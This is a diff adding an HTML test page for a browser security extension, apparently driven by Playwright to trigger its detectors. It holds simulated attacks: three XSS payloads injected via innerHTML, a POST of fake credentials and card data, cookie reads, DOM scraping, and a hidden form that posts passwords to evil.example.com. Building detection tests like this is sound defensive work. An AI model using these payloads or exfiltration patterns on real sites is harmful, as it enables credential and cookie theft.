@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Battacker-Audit Integration Test Page</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #1a1a1a;
+      color: #e5e5e5;
+    }
+    h1 { color: #fff; }
+    .status {
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+    .ready { background: #1e3a2f; border: 1px solid #22c55e; }
+    .info { background: #1e293b; border: 1px solid #3b82f6; }
+    .warn { background: #3f2a1e; border: 1px solid #f59e0b; }
+    button {
+      background: #3b82f6;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin: 5px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+    button:hover { background: #2563eb; }
+    #log {
+      background: #0a0a0a;
+      padding: 16px;
+      border-radius: 4px;
+      max-height: 400px;
+      overflow-y: auto;
+      font-family: monospace;
+      font-size: 12px;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+<body>
+  <h1>Battacker-Audit Integration Test</h1>
+
+  <div class="status ready">
+    Test page loaded. Extensions should inject their content scripts.
+  </div>
+
+  <div class="status info">
+    <strong>Test Functions:</strong><br>
+    - simulateBeacon(): Send tracking beacon<br>
+    - simulateExfiltration(): POST sensitive data<br>
+    - simulateXSS(): Inject XSS payload via innerHTML<br>
+    - simulateCookieRead(): Access document.cookie<br>
+    - simulateDOMScraping(): Mass querySelectorAll calls
+  </div>
+
+  <h2>Manual Test Controls</h2>
+  <div>
+    <button onclick="simulateBeacon()">Beacon</button>
+    <button onclick="simulateExfiltration()">Data Exfil</button>
+    <button onclick="simulateXSS()">XSS</button>
+    <button onclick="simulateCookieRead()">Cookie Read</button>
+    <button onclick="simulateDOMScraping()">DOM Scraping</button>
+    <button onclick="runAllTests()">Run All</button>
+  </div>
+
+  <h2>Event Log</h2>
+  <div id="log">Waiting for tests...</div>
+
+  <!-- Hidden form for credential theft test -->
+  <form id="testForm" action="https://evil.example.com/steal" method="POST" style="display: none;">
+    <input type="password" name="password" value="">
+    <input type="email" name="email" value="">
+  </form>
+
+  <script>
+    const logEl = document.getElementById('log');
+
+    function log(msg) {
+      const timestamp = new Date().toISOString().split('T')[1].slice(0, 12);
+      logEl.textContent += `[${timestamp}] ${msg}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function simulateBeacon() {
+      log('Simulating tracking beacon...');
+      const result = navigator.sendBeacon('/tracking/beacon', JSON.stringify({
+        event: 'pageview',
+        session: 'test-session-' + Date.now(),
+        user_id: 'user-456',
+        timestamp: Date.now()
+      }));
+      log(`Beacon sent: ${result ? 'success' : 'failed'}`);
+    }
+
+    function simulateExfiltration() {
+      log('Simulating data exfiltration...');
+      fetch('/api/collect', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: 'victim@example.com',
+          password: 'supersecret123',
+          api_key: 'sk-1234567890abcdef1234567890abcdef',
+          ssn: '123-45-6789',
+          credit_card: '4111111111111111'
+        })
+      }).then(() => log('Exfiltration request sent'))
+        .catch(e => log('Exfiltration (expected to fail): ' + e.message));
+    }
+
+    function simulateXSS() {
+      log('Simulating XSS payload injection...');
+      const container = document.createElement('div');
+      container.id = 'xss-test-' + Date.now();
+
+      // Multiple XSS patterns
+      container.innerHTML = '<script>alert("xss")<\/script>';
+      document.body.appendChild(container);
+      log('XSS payload 1: script tag');
+
+      const container2 = document.createElement('div');
+      container2.innerHTML = '<img src=x onerror="alert(1)">';
+      document.body.appendChild(container2);
+      log('XSS payload 2: img onerror');
+
+      const container3 = document.createElement('div');
+      container3.innerHTML = '<a href="javascript:alert(1)">click</a>';
+      document.body.appendChild(container3);
+      log('XSS payload 3: javascript: href');
+    }
+
+    function simulateCookieRead() {
+      log('Simulating cookie access...');
+      // Set a test cookie first
+      document.cookie = 'test_session=abc123; path=/';
+
+      // Multiple rapid reads to trigger detection
+      for (let i = 0; i < 10; i++) {
+        const cookies = document.cookie;
+      }
+      log('Cookie accessed 10 times');
+    }
+
+    function simulateDOMScraping() {
+      log('Simulating DOM scraping...');
+      // Trigger scraping detection (threshold is 50 calls in 5 seconds)
+      for (let i = 0; i < 60; i++) {
+        document.querySelectorAll('*');
+        document.querySelectorAll('input');
+        document.querySelectorAll('form');
+      }
+      log('querySelectorAll called 180 times');
+    }
+
+    async function runAllTests() {
+      log('=== Running all attack simulations ===');
+
+      simulateBeacon();
+      await new Promise(r => setTimeout(r, 200));
+
+      simulateExfiltration();
+      await new Promise(r => setTimeout(r, 200));
+
+      simulateXSS();
+      await new Promise(r => setTimeout(r, 200));
+
+      simulateCookieRead();
+      await new Promise(r => setTimeout(r, 200));
+
+      simulateDOMScraping();
+
+      log('=== All tests complete ===');
+    }
+
+    // Export functions for Playwright access
+    window.simulateBeacon = simulateBeacon;
+    window.simulateExfiltration = simulateExfiltration;
+    window.simulateXSS = simulateXSS;
+    window.simulateCookieRead = simulateCookieRead;
+    window.simulateDOMScraping = simulateDOMScraping;
+    window.runAllTests = runAllTests;
+
+    log('Test page initialized');
+    log('api-hooks.js should be injected by Audit extension');
+  </script>
+</body>
+</html>
